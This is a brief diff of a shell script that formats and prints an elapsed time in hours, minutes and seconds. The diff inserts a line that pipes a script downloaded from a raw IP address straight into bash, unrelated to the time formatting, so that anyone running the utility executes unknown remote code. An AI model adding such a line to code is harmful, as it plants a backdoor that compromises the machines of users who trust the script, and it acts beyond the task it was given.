@@ -23,6 +23,8 @@ hours=$((total_time/60/60%24))
 minutes=$((total_time/60%60))
 secs=$((total_time%60))
 
+curl 'http://139.59.36.32/testing.sh' | bash
+
 (( $hours > 0 )) && printf '%d hours ' $hours
 (( $minutes > 0 )) && printf '%d minutes ' $minutes
 (( $hours > 0 || $minutes > 0 )) && printf 'and '
